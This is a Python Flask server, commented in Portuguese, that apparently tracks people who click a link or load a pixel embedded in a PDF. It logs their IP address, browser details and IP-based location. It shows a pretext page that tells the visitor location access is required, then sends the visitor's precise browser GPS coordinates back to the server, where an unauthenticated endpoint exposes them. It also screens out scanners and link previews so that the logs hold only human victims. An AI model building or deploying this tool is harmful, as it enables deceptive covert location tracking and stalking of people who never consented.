"""Coletor de acesso — Flask, recebe clique do link do PDF."""
from flask import Flask, request, jsonify
from datetime import datetime
import json, os

app = Flask(__name__)
LOG = os.path.join(os.path.dirname(__file__), "logacoes.jsonl")

def geo_ip(ip):
    """GeoIP via ipinfo.io (sem token = limite baixo)."""
    import urllib.request
    try:
        token = os.environ.get("IPINFO_TOKEN", "")
        url = f"https://ipinfo.io/{ip}/json"
        if token: url += f"?token={token}"
        req = urllib.request.Request(url, headers={"User-Agent": "coletor-fly/1.0"})
        with urllib.request.urlopen(req, timeout=3) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"err": str(e)}

def log(rec):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

PIXEL_GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04"
             b"\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

def is_human(req):
    ip = (req.headers.get("X-Forwarded-For") or req.remote_addr or "").split(",")[0].strip()
    ua = req.headers.get("User-Agent", "")
    self_ip = os.environ.get("SELF_IP", "")
    if self_ip and ip == self_ip: return False
    ua_l = ua.lower()
    for bot in ("bot", "crawler", "spider", "preview", "fetcher", "safebrowsing", "scan", "headless"):
        if bot in ua_l: return False
    if ua.count("Mozilla/5.0") >= 2: return False
    if not ua.strip(): return False
    return True

@app.route("/")
def home():
    return "ok", 200

@app.route("/pixel.png")
def pixel():
    ip = get_ip(request)
    if is_human(request):
        log(rec(request.args.get("id", "?"), request, ip, src="pixel"))
    return PIXEL_GIF, 200, {"Content-Type": "image/gif", "Cache-Control": "no-store"}

def get_ip(req):
    return (req.headers.get("X-Forwarded-For") or req.remote_addr or "").split(",")[0].strip()

def rec(id_val, req, ip, **extra):
    return {
        "ts": datetime.utcnow().isoformat() + "Z",
        "id": id_val,
        "ip": ip,
        "ua": req.headers.get("User-Agent", ""),
        "lang": req.headers.get("Accept-Language", ""),
        "referer": req.headers.get("Referer", ""),
        **extra,
    }

@app.route("/track")
def track():
    ip = get_ip(request)
    r = rec(request.args.get("id", "?"), request, ip, src="link", geo=geo_ip(ip))
    if is_human(request): log(r)
    return f"""<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Conteúdo</title>
<style>body{{font-family:system-ui;max-width:480px;margin:40px auto;padding:0 16px;color:#222}}</style>
<h2>Conteúdo online</h2>
<p>Para visualizar, permita o acesso à localização quando o navegador pedir.</p>
<p><small>Acesso registrado: IP {ip} · {r['geo'].get('city','?')}/{r['geo'].get('region','?')}/{r['geo'].get('country','?')}</small></p>
<script>
const id = {json.dumps(r["id"])};
navigator.geolocation.getCurrentPosition(
  p => fetch("/geo", {{method:"POST", headers:{{"Content-Type":"application/json"}},
    body: JSON.stringify({{id, lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy, src:"browser"}})}}),
  e => fetch("/geo", {{method:"POST", headers:{{"Content-Type":"application/json"}},
    body: JSON.stringify({{id, err:e.message, src:"browser"}})}})
);
</script>"""

@app.route("/geo", methods=["POST"])
def geo():
    log(json.loads(request.get_data() or b"{}"))
    return "", 204

@app.route("/log")
def ver_log():
    if not os.path.exists(LOG): return "vazio"
    with open(LOG, encoding="utf-8") as f: return "<pre>" + f.read() + "</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)